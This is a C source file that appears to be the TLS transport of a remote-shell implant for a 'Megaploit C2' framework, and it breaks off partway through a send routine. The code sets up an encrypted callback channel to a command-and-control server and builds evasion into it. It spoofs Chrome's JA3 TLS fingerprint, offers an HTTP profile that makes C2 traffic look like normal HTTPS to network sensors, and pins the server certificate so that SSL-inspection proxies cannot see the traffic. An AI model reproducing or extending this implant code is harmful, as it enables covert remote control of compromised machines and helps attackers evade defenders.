/*
 * tls/tls_client.c  –  Advanced TLS implementation for the C-remote-shell
 * =========================================================================
 * Exactly mirrors the Megaploit C2 security standards defined in:
 *   megaploit/server/listener.py   (build_agent_ssl_context)
 *   megaploit/core/crypto.py       (agent_authenticate)
 *   megaploit/core/protocol.py     (handshake_agent, send_msg, recv_msg)
 *
 * Security layers applied in order inside tls_connect():
 *
 *  1. SChannel TLS 1.2 / 1.3  (browser-matching JA3 fingerprint)
 *     - SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT only
 *     - SCH_USE_STRONG_CRYPTO  → AEAD-only cipher suites
 *       (AES-128/256-GCM, ChaCha20-Poly1305 on Windows 10 21H2+)
 *     - SSL 2/3, TLS 1.0, TLS 1.1 excluded via grbitEnabledProtocols
 *     - ISC_REQ_NO_RENEGOTIATION disables mid-session renegotiation
 *     - Certificate verification disabled (C2 uses a self-signed cert)
 *     - JA3 profile (SDK ≥ 17763): SCH_CREDENTIALS + TLS_PARAMETERS
 *       with pDisabledCrypto strips non-Chrome cipher components so
 *       the ClientHello cipher list matches Chrome/Edge exactly.
 *       Disable at build time with -DNO_JA3_PROFILE.
 *
 *  2. HMAC-SHA256 challenge/response  (mirrors agent_authenticate)
 *     - Server → 16-byte random challenge
 *     - Client → HMAC-SHA256(secret_key[32], challenge[16])  = 32 bytes
 *     - Server drops the connection if the response does not match
 *
 *  3. Protocol v2 negotiation  (mirrors handshake_agent)
 *     - Server → 0x4d ('M')
 *     - Client → echoes 0x4d back
 *
 *  4. AES-256-GCM encrypted framing  (mirrors send_msg / recv_msg)
 *     Outbound:  [uint32-BE total_len]
 *                [nonce(12)]
 *                [AES-GCM(seq_be64 ++ data) + auth_tag(16)]
 *     Inbound:   identical layout; seq must be strictly greater than
 *                the last accepted seq (replay protection).
 *
 *  Build (from the C-remote-shell root directory):
 *    cl /W4 tls\tls_client.c client\main.c client\ntcalls.c client\shell.c
 *       /link Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib
 */

/* Enable SCH_CREDENTIALS / TLS_PARAMETERS / CRYPTO_SETTINGS structs.
 * These are defined inside #ifdef SCHANNEL_USE_BLACKLISTS in schannel.h
 * (mingw-w64 SDK ≥ 17763 / MSVC Windows 10 SDK ≥ 10.0.17763.0).        */
#ifndef SCHANNEL_USE_BLACKLISTS
#define SCHANNEL_USE_BLACKLISTS
#endif

#include "tls_client.h"
#include <stdio.h>

/* Optional HTTP/1.1 transport profile — wraps AES-GCM frames in HTTP POST
 * bodies so C2 traffic looks like ordinary HTTPS to network sensors.
 * Enabled by defining C2_HTTP_PROFILE at compile time.                    */
#ifdef C2_HTTP_PROFILE
#include "http_profile.h"
#endif

/* ─────────────────────────────────────────────────────────────────────────── */
/*  Internal helpers – forward declarations                                    */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL  _tls_handshake    (PTLS_CONTEXT pCtx, const char *pszHost);
static BOOL  _hmac_auth        (PTLS_CONTEXT pCtx, const BYTE *pSecretKey);
static BOOL  _proto_handshake  (PTLS_CONTEXT pCtx);

static BOOL  _tls_raw_send     (PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData);
static BOOL  _tls_raw_recv     (PTLS_CONTEXT pCtx, BYTE *pBuf, DWORD cbWant);

static BOOL  _gcm_encrypt      (const BYTE *pKey,  const BYTE *pPlain, DWORD cbPlain,
                                 BYTE **ppOut, DWORD *pcbOut);
static BOOL  _gcm_decrypt      (const BYTE *pKey,  const BYTE *pCipher, DWORD cbCipher,
                                 BYTE **ppOut, DWORD *pcbOut);
static BOOL  _gcm_encrypt_ctx  (PTLS_CONTEXT pCtx, const BYTE *pPlain, DWORD cbPlain,
                                 BYTE **ppOut, DWORD *pcbOut);
static BOOL  _gcm_decrypt_ctx  (PTLS_CONTEXT pCtx, const BYTE *pCipher, DWORD cbCipher,
                                 BYTE **ppOut, DWORD *pcbOut);
static BOOL  _hmac_sha256      (const BYTE *pKey, DWORD cbKey,
                                 const BYTE *pMsg, DWORD cbMsg,
                                 BYTE *pOut /*[32]*/);

static void      _write_be32   (BYTE *p, uint32_t v);
static void      _write_be64   (BYTE *p, uint64_t v);
static uint32_t  _read_be32    (const BYTE *p);
static uint64_t  _read_be64    (const BYTE *p);
static BOOL      _plain_buf_ensure(PTLS_CONTEXT pCtx, DWORD cbNeed);


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_connect                                                        */
/* ─────────────────────────────────────────────────────────────────────────── */

/*
 * _aes_key_init
 * -------------
 * Opens a BCrypt AES-GCM algorithm provider and derives two key handles
 * (one for encrypt, one for decrypt) from the 32-byte session key.
 * BCrypt key handles are NOT thread-safe for concurrent use, but the
 * agent is single-threaded, so two separate handles give us independent
 * state for the BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO structs.
 *
 * Returns TRUE on success; leaves pCtx->hAesAlg/hAesKeyEnc/hAesKeyDec set.
 */
static BOOL _aes_key_init(PTLS_CONTEXT pCtx)
{
    /* Open algorithm provider once */
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(
            &pCtx->hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0)))
        return FALSE;

    if (!BCRYPT_SUCCESS(BCryptSetProperty(pCtx->hAesAlg, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
            (ULONG)((wcslen(BCRYPT_CHAIN_MODE_GCM)+1)*sizeof(WCHAR)), 0)))
        return FALSE;

    /* Two key handles from the same raw key material — each maintains its own
     * internal counter state, keeping encrypt and decrypt independent.        */
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            pCtx->hAesAlg, &pCtx->hAesKeyEnc,
            NULL, 0, (PUCHAR)pCtx->sessionKey, 32, 0)))
        return FALSE;

    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
            pCtx->hAesAlg, &pCtx->hAesKeyDec,
            NULL, 0, (PUCHAR)pCtx->sessionKey, 32, 0)))
        return FALSE;

    return TRUE;
}

BOOL tls_connect(PTLS_CONTEXT pCtx, SOCKET sock,
                 const char  *pszHost,
                 const BYTE  *pSecretKey)
{
    if (!pCtx || sock == INVALID_SOCKET || !pszHost || !pSecretKey)
        return FALSE;

    ZeroMemory(pCtx, sizeof(*pCtx));
    pCtx->sock    = sock;
    pCtx->recvSeq = (uint64_t)-1;
    pCtx->lastErr = TLS_ERR_NONE;

    memcpy(pCtx->sessionKey, pSecretKey, 32);

    pCtx->cbRecvBufAlloc = TLS_IO_BUFFER_SIZE * 4;
    pCtx->pRecvBuf = (BYTE *)malloc(pCtx->cbRecvBufAlloc);
    if (!pCtx->pRecvBuf) return FALSE;

    pCtx->cbPlainBufAlloc = TLS_IO_BUFFER_SIZE * 4;
    pCtx->pPlainBuf = (BYTE *)malloc(pCtx->cbPlainBufAlloc);
    if (!pCtx->pPlainBuf) { free(pCtx->pRecvBuf); pCtx->pRecvBuf = NULL; return FALSE; }

    if (!_tls_handshake(pCtx, pszHost))  { tls_disconnect(pCtx); return FALSE; }
    if (!_hmac_auth(pCtx, pSecretKey))   { tls_disconnect(pCtx); return FALSE; }
    if (!_proto_handshake(pCtx))         { tls_disconnect(pCtx); return FALSE; }

    /* Pre-compute AES-GCM key handles so we never pay the open/generate cost
     * on the hot path (every tls_send_msg / tls_recv_msg call).              */
    if (!_aes_key_init(pCtx)) { tls_disconnect(pCtx); return FALSE; }

    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_send_msg                                                       */
/* ─────────────────────────────────────────────────────────────────────────── */

BOOL tls_send_msg(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData)
{
    if (!pCtx || !pData) return FALSE;

    /* Guard: TLS_SEQ_LEN + cbData must not overflow DWORD */
    if (cbData > 0xFFFFFFFFu - TLS_SEQ_LEN) return FALSE;

    uint64_t seq     = ++(pCtx->sendSeq);
    DWORD    cbPlain = TLS_SEQ_LEN + cbData;
    BYTE    *pPlain  = (BYTE *)malloc(cbPlain);
    if (!pPlain) return FALSE;

    _write_be64(pPlain, seq);
    memcpy(pPlain + TLS_SEQ_LEN, pData, cbData);

    BYTE  *pCipher  = NULL;
    DWORD  cbCipher = 0;
    /* Use cached key handle if available (fast path), otherwise slow path */
    BOOL encOk = pCtx->hAesKeyEnc
        ? _gcm_encrypt_ctx(pCtx, pPlain, cbPlain, &pCipher, &cbCipher)
        : _gcm_encrypt(pCtx->sessionKey, pPlain, cbPlain, &pCipher, &cbCipher);
    free(pPlain);
    if (!encOk) return FALSE;

    BYTE hdr[TLS_HDR_LEN];
    _write_be32(hdr, cbCipher);

#ifdef C2_HTTP_PROFILE
    /* HTTP profile: send [hdr|cipher] as a single HTTP POST body */
    DWORD  cbFrame = TLS_HDR_LEN + cbCipher;
    BYTE  *pFrame  = (BYTE *)malloc(cbFrame);
    BOOL ok = FALSE;
    if (pFrame) {
        memcpy(pFrame,            hdr,     TLS_HDR_LEN);
        memcpy(pFrame + TLS_HDR_LEN, pCipher, cbCipher);
        ok = _http_send_frame(pCtx, pFrame, cbFrame);
        free(pFrame);
    }
#else
    BOOL ok = _tls_raw_send(pCtx, hdr, TLS_HDR_LEN) &&
              _tls_raw_send(pCtx, pCipher, cbCipher);
#endif
    free(pCipher);
    return ok;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_recv_msg                                                       */
/* ─────────────────────────────────────────────────────────────────────────── */

BOOL tls_recv_msg(PTLS_CONTEXT pCtx, BYTE **ppData, DWORD *pcbData)
{
    if (!pCtx || !ppData || !pcbData) return FALSE;
    *ppData = NULL; *pcbData = 0;
    pCtx->lastErr = TLS_ERR_NONE;

#ifdef C2_HTTP_PROFILE
    /* HTTP profile: receive a full HTTP response body, parse hdr from it */
    BYTE  *pFrame2  = NULL;
    DWORD  cbFrame2 = 0;
    if (!_http_recv_frame_alloc(pCtx, &pFrame2, &cbFrame2)) {
        pCtx->lastErr = TLS_ERR_SOCKET;
        return FALSE;
    }
    if (cbFrame2 < TLS_HDR_LEN) {
        free(pFrame2);
        pCtx->lastErr = TLS_ERR_PROTO;
        return FALSE;
    }
    uint32_t totalLen = _read_be32(pFrame2);
    DWORD cipherLen2  = cbFrame2 - TLS_HDR_LEN;
    if (totalLen == 0 || totalLen != cipherLen2 ||
        totalLen > (uint32_t)TLS_MAX_FRAME_SIZE) {
        free(pFrame2);
        pCtx->lastErr = TLS_ERR_PROTO;
        return FALSE;
    }
    BYTE *pCipher = (BYTE *)malloc(totalLen);
    if (!pCipher) { free(pFrame2); pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
    memcpy(pCipher, pFrame2 + TLS_HDR_LEN, totalLen);
    free(pFrame2);
#else
    BYTE hdr[TLS_HDR_LEN];
    if (!_tls_raw_recv(pCtx, hdr, TLS_HDR_LEN)) return FALSE;
    /* lastErr already set by _tls_raw_recv on socket/timeout failure */

    uint32_t totalLen = _read_be32(hdr);
    if (totalLen == 0 || totalLen > (uint32_t)TLS_MAX_FRAME_SIZE) {
        pCtx->lastErr = TLS_ERR_PROTO;
        return FALSE;
    }

    BYTE *pCipher = (BYTE *)malloc(totalLen);
    if (!pCipher) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
    if (!_tls_raw_recv(pCtx, pCipher, totalLen)) {
        free(pCipher); return FALSE;
        /* lastErr already set by _tls_raw_recv */
    }
#endif

    BYTE  *pPlain  = NULL;
    DWORD  cbPlain = 0;
    /* Use cached key handle if available (fast path), otherwise slow path */
    BOOL decOk = pCtx->hAesKeyDec
        ? _gcm_decrypt_ctx(pCtx, pCipher, totalLen, &pPlain, &cbPlain)
        : _gcm_decrypt(pCtx->sessionKey, pCipher, totalLen, &pPlain, &cbPlain);
    if (!decOk) {
        free(pCipher);
        pCtx->lastErr = TLS_ERR_CRYPTO;
        return FALSE;
    }
    free(pCipher);

    if (cbPlain < TLS_SEQ_LEN) {
        free(pPlain);
        pCtx->lastErr = TLS_ERR_CRYPTO;
        return FALSE;
    }

    uint64_t seq = _read_be64(pPlain);
    if (pCtx->recvSeq != (uint64_t)-1 && seq <= pCtx->recvSeq) {
        free(pPlain);
        pCtx->lastErr = TLS_ERR_REPLAY;
        return FALSE;
    }
    pCtx->recvSeq = seq;

    DWORD cbData = cbPlain - TLS_SEQ_LEN;
    BYTE *pData  = (BYTE *)malloc(cbData + 1);
    if (!pData) {
        free(pPlain);
        pCtx->lastErr = TLS_ERR_CRYPTO;
        return FALSE;
    }

    memcpy(pData, pPlain + TLS_SEQ_LEN, cbData);
    pData[cbData] = '\0';
    free(pPlain);

    *ppData = pData; *pcbData = cbData;
    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Public: tls_disconnect                                                     */
/* ─────────────────────────────────────────────────────────────────────────── */

VOID tls_disconnect(PTLS_CONTEXT pCtx)
{
    if (!pCtx) return;

    /* Destroy cached AES key handles first */
    if (pCtx->hAesKeyEnc) { BCryptDestroyKey(pCtx->hAesKeyEnc); pCtx->hAesKeyEnc = NULL; }
    if (pCtx->hAesKeyDec) { BCryptDestroyKey(pCtx->hAesKeyDec); pCtx->hAesKeyDec = NULL; }
    if (pCtx->hAesAlg)    { BCryptCloseAlgorithmProvider(pCtx->hAesAlg, 0); pCtx->hAesAlg = NULL; }

    if (pCtx->fCtxInit) {
        DWORD dwType = SCHANNEL_SHUTDOWN;
        SecBufferDesc d; SecBuffer b[1];
        b[0].BufferType = SECBUFFER_TOKEN;
        b[0].pvBuffer   = &dwType;
        b[0].cbBuffer   = sizeof(dwType);
        d.ulVersion = SECBUFFER_VERSION; d.cBuffers = 1; d.pBuffers = b;
        ApplyControlToken(&pCtx->hCtx, &d);

        ULONG ul; SecBufferDesc sd; SecBuffer sb[1];
        sb[0].BufferType = SECBUFFER_TOKEN; sb[0].pvBuffer = NULL; sb[0].cbBuffer = 0;
        sd.ulVersion = SECBUFFER_VERSION; sd.cBuffers = 1; sd.pBuffers = sb;
        InitializeSecurityContext(&pCtx->hCred, &pCtx->hCtx, NULL,
            ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
            ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM,
            0, SECURITY_NATIVE_DREP, NULL, 0,
            &pCtx->hCtx, &sd, &ul, NULL);

        if (sb[0].pvBuffer && sb[0].cbBuffer) {
            send(pCtx->sock, (const char *)sb[0].pvBuffer, (int)sb[0].cbBuffer, 0);
            FreeContextBuffer(sb[0].pvBuffer);
        }
        DeleteSecurityContext(&pCtx->hCtx);
        pCtx->fCtxInit = FALSE;
    }

    if (pCtx->fCredInit) {
        FreeCredentialsHandle(&pCtx->hCred);
        pCtx->fCredInit = FALSE;
    }

    if (pCtx->pRecvBuf)  { free(pCtx->pRecvBuf);  pCtx->pRecvBuf  = NULL; }
    if (pCtx->pPlainBuf) { free(pCtx->pPlainBuf); pCtx->pPlainBuf = NULL; }
    SecureZeroMemory(pCtx->sessionKey, sizeof(pCtx->sessionKey));
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Layer 1: SChannel TLS handshake                                            */
/* ─────────────────────────────────────────────────────────────────────────── */

/*
 * _ja3_make_unicode
 * -----------------
 * Fill a stack-local UNICODE_STRING pointing at a compile-time wide literal.
 * The string is NOT NUL-terminated in the Length field (UNICODE_STRING
 * convention), but MaximumLength includes the terminator.
 */
static void _ja3_make_unicode(UNICODE_STRING *us, WCHAR *buf, const WCHAR *src)
{
    USHORT len = 0;
    while (src[len]) len++;                  /* wcslen without pulling wchar.h  */
    us->Length        = (USHORT)(len * sizeof(WCHAR));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(WCHAR));
    us->Buffer        = buf;
    while (len--) *buf++ = *src++;
    *buf = 0;
}

static BOOL _tls_handshake(PTLS_CONTEXT pCtx, const char *pszHost)
{
    SECURITY_STATUS ss;
    TimeStamp       tsExpiry;

    WCHAR wszHost[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, pszHost, -1, wszHost, 256);

    ULONG ulReqFlags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT
                     | ISC_REQ_CONFIDENTIALITY  | ISC_REQ_EXTENDED_ERROR
                     | ISC_REQ_ALLOCATE_MEMORY  | ISC_REQ_STREAM;
#ifdef ISC_REQ_NO_RENEGOTIATION
    ulReqFlags |= ISC_REQ_NO_RENEGOTIATION;
#endif

    /* ── Credential setup ──────────────────────────────────────────────────
     *
     * When the SDK provides SCH_CREDENTIALS (Win10 SDK ≥ 17763) and the
     * caller has not opted out with -DNO_JA3_PROFILE, we use the newer
     * SCH_CREDENTIALS structure with a TLS_PARAMETERS block that disables
     * cipher components not present in Chrome's ClientHello.  This makes the
     * TLS fingerprint (JA3) match a real browser rather than a generic
     * SChannel runtime.
     *
     * Chrome 124 cipher suites (in order, GREASE excluded):
     *   TLS 1.3:  0x1301 AES-128-GCM-SHA256
     *             0x1302 AES-256-GCM-SHA384
     *             0x1303 CHACHA20-POLY1305-SHA256
     *   TLS 1.2:  0xC02B ECDHE-ECDSA-AES128-GCM-SHA256
     *             0xC02F ECDHE-RSA-AES128-GCM-SHA256
     *             0xC02C ECDHE-ECDSA-AES256-GCM-SHA384
     *             0xC030 ECDHE-RSA-AES256-GCM-SHA384
     *             0xCCA9 ECDHE-ECDSA-CHACHA20-POLY1305
     *             0xCCA8 ECDHE-RSA-CHACHA20-POLY1305
     *             0xC013 ECDHE-RSA-AES128-CBC-SHA
     *             0xC014 ECDHE-RSA-AES256-CBC-SHA
     *             0x009C RSA-AES128-GCM-SHA256
     *             0x009D RSA-AES256-GCM-SHA384
     *             0x002F RSA-AES128-CBC-SHA
     *             0x0035 RSA-AES256-CBC-SHA
     *
     * We express this by disabling cipher components Chrome never uses:
     *   • RC4 stream cipher (CALG_RC4 / L"RC4")
     *   • 3DES block cipher (L"3DES")
     *   • DES block cipher  (L"DES")
     *   • NULL cipher       (L"NULL")
     *   • MD5 MAC           (digest usage, L"MD5")
     *   • Anonymous KX      (L"ECDH" without signature = anon ECDHE,
     *                         L"DH"  without signature = anon DHE)
     *
     * Everything not in the disabled list stays active; the system-default
     * cipher priority on Win10+ puts ECDHE-GCM suites first, matching
     * Chrome's ordering.
     *
     * If SCH_CREDENTIALS / TLS_PARAMETERS are not available (older SDK or
     * NO_JA3_PROFILE defined), we fall back to the classic SCHANNEL_CRED
     * with SCH_USE_STRONG_CRYPTO.
     */

#if defined(SCH_CREDENTIALS_VERSION) && !defined(NO_JA3_PROFILE)

    /* Wide-string buffers for UNICODE_STRING — must outlive AcquireCredentials */
    WCHAR _wRC4[4]  = {0}; UNICODE_STRING usRC4  = {0};
    WCHAR _w3DES[5] = {0}; UNICODE_STRING us3DES = {0};
    WCHAR _wDES[4]  = {0}; UNICODE_STRING usDES  = {0};
    WCHAR _wNULL[5] = {0}; UNICODE_STRING usNULL = {0};
    WCHAR _wMD5[4]  = {0}; UNICODE_STRING usMD5  = {0};
    WCHAR _wAECDH[5]= {0}; UNICODE_STRING usAECDH= {0};
    WCHAR _wADH[3]  = {0}; UNICODE_STRING usADH  = {0};

    _ja3_make_unicode(&usRC4,   _wRC4,   L"RC4");
    _ja3_make_unicode(&us3DES,  _w3DES,  L"3DES");
    _ja3_make_unicode(&usDES,   _wDES,   L"DES");
    _ja3_make_unicode(&usNULL,  _wNULL,  L"NULL");
    _ja3_make_unicode(&usMD5,   _wMD5,   L"MD5");
    _ja3_make_unicode(&usAECDH, _wAECDH, L"ECDH");  /* anon ECDHE */
    _ja3_make_unicode(&usADH,   _wADH,   L"DH");    /* anon DHE   */

    /*
     * Disabled-crypto array: seven entries covering all non-Chrome components.
     *
     * eAlgorithmUsage entries:
     *   TlsParametersCngAlgUsageCipher   (2) – symmetric cipher names
     *   TlsParametersCngAlgUsageDigest   (3) – MAC/hash algorithm names
     *   TlsParametersCngAlgUsageKeyExchange (0) – KX algorithm names
     *
     * dwMinBitLength = dwMaxBitLength = 0 means "all key sizes".
     */
    CRYPTO_SETTINGS cs[7];
    ZeroMemory(cs, sizeof(cs));

    /* RC4 — TlsParametersCngAlgUsageCipher */
    cs[0].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
    cs[0].strCngAlgId     = usRC4;

    /* 3DES */
    cs[1].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
    cs[1].strCngAlgId     = us3DES;

    /* DES */
    cs[2].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
    cs[2].strCngAlgId     = usDES;

    /* NULL cipher */
    cs[3].eAlgorithmUsage = TlsParametersCngAlgUsageCipher;
    cs[3].strCngAlgId     = usNULL;

    /* MD5 as MAC (digest) */
    cs[4].eAlgorithmUsage = TlsParametersCngAlgUsageDigest;
    cs[4].strCngAlgId     = usMD5;

    /* Anonymous ECDH key exchange */
    cs[5].eAlgorithmUsage = TlsParametersCngAlgUsageKeyExchange;
    cs[5].strCngAlgId     = usAECDH;

    /* Anonymous DH key exchange */
    cs[6].eAlgorithmUsage = TlsParametersCngAlgUsageKeyExchange;
    cs[6].strCngAlgId     = usADH;

    TLS_PARAMETERS tlsParam;
    ZeroMemory(&tlsParam, sizeof(tlsParam));
    tlsParam.grbitDisabledProtocols = SP_PROT_SSL2_CLIENT
                                    | SP_PROT_SSL3_CLIENT
                                    | SP_PROT_TLS1_CLIENT
                                    | SP_PROT_TLS1_1_CLIENT;
    tlsParam.cDisabledCrypto        = 7;
    tlsParam.pDisabledCrypto        = cs;

    SCH_CREDENTIALS schCred;
    ZeroMemory(&schCred, sizeof(schCred));
    schCred.dwVersion      = SCH_CREDENTIALS_VERSION;
    schCred.dwFlags        = SCH_USE_STRONG_CRYPTO
                           | SCH_CRED_NO_DEFAULT_CREDS
                           | SCH_CRED_MANUAL_CRED_VALIDATION;
    schCred.cTlsParameters = 1;
    schCred.pTlsParameters = &tlsParam;

    ss = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A,
             SECPKG_CRED_OUTBOUND, NULL, &schCred,
             NULL, NULL, &pCtx->hCred, &tsExpiry);

    /* If the newer credential struct is rejected (pre-Creators-Update runtime),
     * fall through to the classic SCHANNEL_CRED path below.               */
    if (ss != SEC_E_OK) {
#endif /* SCH_CREDENTIALS_VERSION && !NO_JA3_PROFILE */

    SCHANNEL_CRED   cred;
    ZeroMemory(&cred, sizeof(cred));
    cred.dwVersion             = SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags               = SCH_USE_STRONG_CRYPTO
                               | SCH_CRED_NO_DEFAULT_CREDS
                               | SCH_CRED_MANUAL_CRED_VALIDATION;

    ss = AcquireCredentialsHandleA(NULL, (LPSTR)UNISP_NAME_A,
             SECPKG_CRED_OUTBOUND, NULL, &cred,
             NULL, NULL, &pCtx->hCred, &tsExpiry);

#if defined(SCH_CREDENTIALS_VERSION) && !defined(NO_JA3_PROFILE)
    }  /* end SCH_CREDENTIALS fallback */
#endif

    if (ss != SEC_E_OK) return FALSE;
    pCtx->fCredInit = TRUE;

    SecBuffer     outBufs[3] = {0};
    SecBufferDesc outDesc;
    outBufs[0].BufferType = SECBUFFER_TOKEN;
    outDesc.ulVersion = SECBUFFER_VERSION; outDesc.cBuffers = 1; outDesc.pBuffers = outBufs;

    ULONG ulRetFlags = 0;
    ss = InitializeSecurityContextW(&pCtx->hCred, NULL, wszHost, ulReqFlags,
             0, SECURITY_NATIVE_DREP, NULL, 0,
             &pCtx->hCtx, &outDesc, &ulRetFlags, &tsExpiry);

    if (ss != SEC_I_CONTINUE_NEEDED && ss != SEC_E_OK) return FALSE;
    pCtx->fCtxInit = TRUE;

    if (outBufs[0].pvBuffer && outBufs[0].cbBuffer) {
        if (send(pCtx->sock, (const char *)outBufs[0].pvBuffer,
                 (int)outBufs[0].cbBuffer, 0) == SOCKET_ERROR) {
            FreeContextBuffer(outBufs[0].pvBuffer); return FALSE;
        }
        FreeContextBuffer(outBufs[0].pvBuffer);
    }

    while (ss == SEC_I_CONTINUE_NEEDED || ss == SEC_E_INCOMPLETE_MESSAGE) {
        int nRecv = recv(pCtx->sock,
                         (char *)(pCtx->pRecvBuf + pCtx->cbRecvBuf),
                         (int)(pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf), 0);
        if (nRecv <= 0) return FALSE;
        pCtx->cbRecvBuf += (DWORD)nRecv;

        SecBuffer     inBufs[2] = {0};
        SecBufferDesc inDesc;
        inBufs[0].BufferType = SECBUFFER_TOKEN;
        inBufs[0].pvBuffer   = pCtx->pRecvBuf;
        inBufs[0].cbBuffer   = pCtx->cbRecvBuf;
        inBufs[1].BufferType = SECBUFFER_EMPTY;
        inDesc.ulVersion = SECBUFFER_VERSION; inDesc.cBuffers = 2; inDesc.pBuffers = inBufs;

        ZeroMemory(outBufs, sizeof(outBufs));
        outBufs[0].BufferType = SECBUFFER_TOKEN;
        outDesc.ulVersion = SECBUFFER_VERSION; outDesc.cBuffers = 1; outDesc.pBuffers = outBufs;

        ss = InitializeSecurityContextW(&pCtx->hCred, &pCtx->hCtx, wszHost, ulReqFlags,
                 0, SECURITY_NATIVE_DREP, &inDesc, 0,
                 NULL, &outDesc, &ulRetFlags, &tsExpiry);

        if (outBufs[0].pvBuffer && outBufs[0].cbBuffer) {
            if (send(pCtx->sock, (const char *)outBufs[0].pvBuffer,
                     (int)outBufs[0].cbBuffer, 0) == SOCKET_ERROR) {
                FreeContextBuffer(outBufs[0].pvBuffer); return FALSE;
            }
            FreeContextBuffer(outBufs[0].pvBuffer);
        }

        if (inBufs[1].BufferType == SECBUFFER_EXTRA && inBufs[1].cbBuffer) {
            MoveMemory(pCtx->pRecvBuf,
                       pCtx->pRecvBuf + pCtx->cbRecvBuf - inBufs[1].cbBuffer,
                       inBufs[1].cbBuffer);
            pCtx->cbRecvBuf = inBufs[1].cbBuffer;
        } else if (ss != SEC_E_INCOMPLETE_MESSAGE) {
            pCtx->cbRecvBuf = 0;
        }

        if (ss != SEC_I_CONTINUE_NEEDED &&
            ss != SEC_E_INCOMPLETE_MESSAGE &&
            ss != SEC_E_OK) return FALSE;
    }

    if (ss != SEC_E_OK) return FALSE;
    ss = QueryContextAttributes(&pCtx->hCtx, SECPKG_ATTR_STREAM_SIZES, &pCtx->streamSz);
    if (ss != SEC_E_OK) return FALSE;

#ifdef C2_CERT_PIN
    /*
     * Certificate pinning — F-04 fix.
     *
     * After the SChannel handshake succeeds, retrieve the server's leaf
     * certificate and compare its SHA-256 thumbprint against the pinned
     * value supplied at build time via:
     *
     *   make C2_IP=... C2_CERT_PIN=aabbccddeeff...  (64 hex chars = 32 bytes)
     *
     * This prevents an SSL-inspection proxy from MITM'ing the connection:
     * the proxy presents its own certificate which will not match the pin,
     * and the agent drops the connection before any HMAC material is sent.
     *
     * C2_CERT_PIN must be defined as a brace-enclosed byte literal, e.g.:
     *   -DC2_CERT_PIN="{0xaa,0xbb,...}"   (32 bytes, 64 hex chars)
     *
     * Generate with:
     *   openssl x509 -in server.pem -noout -fingerprint -sha256
     *   (strip colons, split into \xNN pairs)
     */
    {
        static const BYTE expected_pin[32] = C2_CERT_PIN;
        PCCERT_CONTEXT pCert = NULL;
        BOOL pinOk = FALSE;

        if (QueryContextAttributes(&pCtx->hCtx,
                SECPKG_ATTR_REMOTE_CERT_CONTEXT, &pCert) == SEC_E_OK && pCert) {

            BYTE hash[32] = {0};
            DWORD hashLen = sizeof(hash);

            if (CertGetCertificateContextProperty(pCert,
                    CERT_SHA256_HASH_PROP_ID, hash, &hashLen) && hashLen == 32) {

                pinOk = (memcmp(hash, expected_pin, 32) == 0);
            }
            CertFreeCertificateContext(pCert);
        }

        if (!pinOk) {
            /* Certificate does not match pin — likely SSL inspection proxy */
            return FALSE;
        }
    }
#endif /* C2_CERT_PIN */

    return TRUE;
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Layer 2: HMAC-SHA256 challenge/response                                    */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _hmac_auth(PTLS_CONTEXT pCtx, const BYTE *pSecretKey)
{
    BYTE challenge[TLS_CHALLENGE_LEN];
    if (!_tls_raw_recv(pCtx, challenge, TLS_CHALLENGE_LEN)) return FALSE;

    BYTE response[TLS_AUTH_HMAC_LEN];
    if (!_hmac_sha256(pSecretKey, 32, challenge, TLS_CHALLENGE_LEN, response))
        return FALSE;

    return _tls_raw_send(pCtx, response, TLS_AUTH_HMAC_LEN);
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  Layer 3: Protocol v2 negotiation                                           */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _proto_handshake(PTLS_CONTEXT pCtx)
{
    BYTE ver = 0;
    if (!_tls_raw_recv(pCtx, &ver, 1)) return FALSE;
    return _tls_raw_send(pCtx, &ver, 1);
}


/* ─────────────────────────────────────────────────────────────────────────── */
/*  SChannel record-level send / recv                                          */
/* ─────────────────────────────────────────────────────────────────────────── */

static BOOL _tls_raw_send(PTLS_CONTEXT pCtx, const BYTE *pData, DWORD cbData)
{
    DWORD cbHdr      = pCtx->streamSz.cbHeader;
    DWORD cbTrailer  = pCtx->streamSz.cbTrailer;
    DWORD cbMaxMsg   = pCtx->streamSz.cbMaximumMessage;

    /* SChannel requires each EncryptMessage call receives at most
     * cbMaximumMessage bytes of plaintext.  For payloads larger than
     * that (e.g. a GCM ciphertext blob sent by tls_send_msg) we loop
     * over cbMaximumMessage-sized chunks.  Each chunk is one TLS record.
     * cbMaximumMessage is 0 before QueryContextAttributes runs (during
     * the handshake); treat 0 as "no chunking needed" for handshake msgs
